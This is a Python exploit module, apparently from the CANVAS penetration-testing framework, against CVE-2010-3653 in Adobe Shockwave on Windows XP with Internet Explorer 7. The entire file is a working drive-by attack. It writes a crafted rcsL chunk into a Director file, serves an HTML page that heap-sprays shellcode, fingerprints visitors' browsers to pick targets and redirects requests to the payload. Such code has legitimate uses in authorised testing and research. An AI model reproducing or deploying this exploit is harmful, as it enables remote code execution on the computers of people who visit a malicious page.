#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  adobe_shockwave_rcslchunk.py
## Description:
##            :
## Created_On :  Wed Oct 21 10:28:59 2010
## Created_By :  Franco Riccobaldi
## Modified_On:  Fri Oct 21 10:47:43 2010
## Modified_By:  Franco Riccobaldi
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################

import sys
if '.' not in sys.path: sys.path.append('.')

import struct
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

import os.path

NAME=__file__.split(os.path.sep)[-2] #automatically get our exploit name

DESCRIPTION='Adobe Shockwave rcsL chunk corruption'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Adobe'
DOCUMENTATION['Date public']='10/21/2010'
DOCUMENTATION['References']=['']
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']='Adobe Shockwave <= 11.5.8.612'
DOCUMENTATION['CVE Name']='CVE-2010-3653'
DOCUMENTATION['CVE Url'] = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3653'
DOCUMENTATION["Notes"] = """
This exploit can only be used from clientd.

Tested on:
Windows XP Professional SP3 EN with IE 7.
Windows XP Home SP3 EN with IE7.

Does not support HTTP MOSDEF
"""

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']
PROPERTY['DELIVERY']='HTTP'

CHANGELOG="""
"""

targets={
    0:['N/A',0],
    1:['Windows XP SP3',0],
}

import string,random

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version=0
        self.name=NAME
        self.filename=''.join([random.choice(string.uppercase) for x in range(8)])+'.html'
        self.filename_director=''.join([random.choice(string.uppercase) for x in range(8)])+'.dir'
        self.source_director = 'original.dir'
        self.plugin_info=None # We want clientd to give us a plugin dict
        self.nohttpmosdef = True # Payload too big
        self.respath = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.addr = 0x4B7C # offset of rcsL chunk in original file
        return


    def is_vulnerable(self, info_dict):
        if not self.isWindowsXP(info_dict):
            self.log("%s: Unsure that this is Windows XP, which is the only OS we support currently"%self.name)
            return 0
        user_agent = info_dict.get('user_agent',"")
        if 'MSIE 8' not in user_agent and 'MSIE 7.0' not in user_agent: #Not in tested version of IE
            self.log("%s: User Agent not MSIE 7/8 - bailing out. %s"%(self.name, user_agent))
            return 0
        return 70


    def makechunk(self):
        rcsL =      "\x72\x63\x73\x4C\x16\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x16\x00\x00\x01\x16"
        rcsL +=     "\x00\x5C\x00\x07\x00\x01\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x02\xC4\x43\xB8\x00\x00\x00\x00\x00\x00"
        rcsL +=     "\x00\x00\x00\x00\x00\x01\x00\x0A\xFF\xFF\x00\x00\x00\x00\x01\x16\x00\x00\x00\x00\x00\x00\x00\x00"
        rcsL +=     "\x00\x5C\x00\x00\x00\x00\x00\x5C\x00\x01\x00\x00\x00\x5C\x00\x02\x00\x00\x00\xF0\x00\x00\x00\x16"
        rcsL +=     "\x00\x00\x01\x00\x00\x1B\xFF\xFF\x00\x00\x00\x5A\x00\x00\x00\x8A\x00\x01\x00\x00\x00\xE4\x00\x01"
        rcsL +=     "\x00\x00\x00\xE6\x00\x00\x00\x00\x00\xE8\x00\x00\x00\x0E\x00\x01\x00\x08\x00\x00\x00\xE8\x00\x00"
        rcsL +=     "\x00\x05\x41\x05\x43\x01\x57\x4C\x70\x02\x44\x00\x43\x02\xA7\x01\xE7\x52\x00\x4C\x00\x70\x0A\x41"
        rcsL +=     "\x1D\x41\x50\x41\x2D\x09\x43\x03\x57\x0B\x62\x10\x4C\x00\x70\x0A\x41\x48\x41\x34\xAE\x00\x8B\x43"
        rcsL +=     "\x03\x57\x0B\xA2\x01\x02\x4C\x00\x00\x00\x00\x80\x00\x00\xF0"
        rcsL +=     struct.pack(">L",0xFFF00267) # Argument used to calculate an indirect call
        rcsL +=     "\x25\xA2\x01\x33\x41\x05\x43\x01\x57\x4C\x41\x01\x43\x01\x57\x02\x44\x00\x43\x02\x67\x37\x62\x37"
        rcsL +=     "\x01\x00\x05\x01\xE8\x00\x11\x11\x12\x11\x00\x14\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
        rcsL +=     "\x01\x00\x00\x00\x0C\x00\x00\x00\x08\x6E\x65\x77\x63\x61\x6D\x31\x00\x00\x00\x00\x06\x70\x65\x72\x73\x70\x00"
        f = open(os.path.join(self.respath, self.source_director),'r+b')
        for i in range(len(rcsL)):
            f.seek(self.addr+i)
            f.write(rcsL[i])
        f.close()
        return open(os.path.join(self.respath, self.source_director), 'rb').read()

    def makefile(self,request_header=None):

        filedata="""<html>
<body>
<script>
	 shellcode = unescape('SHELLCODE')

     nops=unescape('%u0a0a%u0a0a');
     headersize =20;
     slackspace= headersize + shellcode.length;
     while(nops.length< slackspace) nops+= nops;
     fillblock= nops.substring(0, slackspace);
     block= nops.substring(0, nops.length- slackspace);
     while( block.length+ slackspace<0x200000) block= block+ block+ fillblock;
     memory=new Array();
     for( counter=0; counter<200; counter++) memory[counter]= block + shellcode;

     //IE 8 heap spray
     //h1 = []
     //h1[0] = block + shellcode;
     //for( counter=0; counter<200; counter++) h1[counter] = h1[0].substring(0, h1[0].length);

</script>

<object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258"
 codebase="http://download.macromedia.com/pub/shockwave/cabs/director/sw.cab#version=11,5,0,593"
 width=600 height=430 VIEWASTEXT>
<param name=src value="FILENAME">
<param name=swRemote value="swSaveEnabled='true' swVolume='true' swRestart='true' swPausePlay='true' swFastForward='true' swContextMenu='true' ">
<param name=swStretchStyle value=fill>
<param name=PlayerVersion value=11>
<PARAM NAME=bgColor VALUE=#FFFFFF>
<embed src="FILENAME" bgColor=#FFFFFF  width=600 height=430 swRemote="swSaveEnabled='true' swVolume='true' swRestart='true' swPausePlay='true' swFastForward='true' swContextMenu='true' " swStretchStyle=fill
 type="application/x-director" PlayerVersion=11 pluginspage="http://www.macromedia.com/shockwave/download/"></embed>
</object>
</body>
</html>
""".replace('FILENAME',self.filename_director).replace("SHELLCODE",urluencode('AAAA'+self.shellcode))

        print urluencode('AAAA'+self.shellcode)



        self.debuglog("Built the exploit")
        return filedata

    def makesploit(self, clientheader, clientbody):
        from libs.spkproxy import header, body
        # header is used to store request and reponse headers
        header=header('SERVER')
        body=body()
        # Clientd gives us a lot of information about the remote endpoint
        if self.plugin_info:
            # Check if the remote endpoint is vulnerable to our exploit
            if self.is_vulnerable(self.plugin_info)==0:
                self.log('Bailing on this client as it is not likely to be vulnerable')
                #Return a 404 here?
                return None,None
        if clientheader.URL.count(self.filename):
            self.log('%s: Serving HTML file'%self.name)
            # Create the shellcode (self.shellcode)
            self.createShellcode()
            # Create the HTML Contents
            html=self.makefile(request_header=clientheader)
            if not html:
                self.log("%s: Error creating HTML for this exploit"%self.name)
                return None, None #done
            body.setBody(html)
            header.addHeader('Content-Type','text/html')

        elif clientheader.URL.count(self.filename_director):
            self.log('Serving Shockwave DIR file')
            body.setBody(self.makechunk())
            header.addHeader('Content-Type','application/x-director')

        else:
            self.log('%s: Redirecting to self'%self.name)
            header.status='302'
            header.addHeader('Location',self.filename)
            header.addHeader('Content-Type','text/html')
        return header,body

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()

    def getArgs(self):
        self.host=self.target.interface
        self.getarg('filename')
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        # Populate the needed arguments of the exploit
        self.getArgs()
        # Build the html that triggers the vulnerability
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.debuglog('Wrote to %s'%(self.filename),color='red')
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
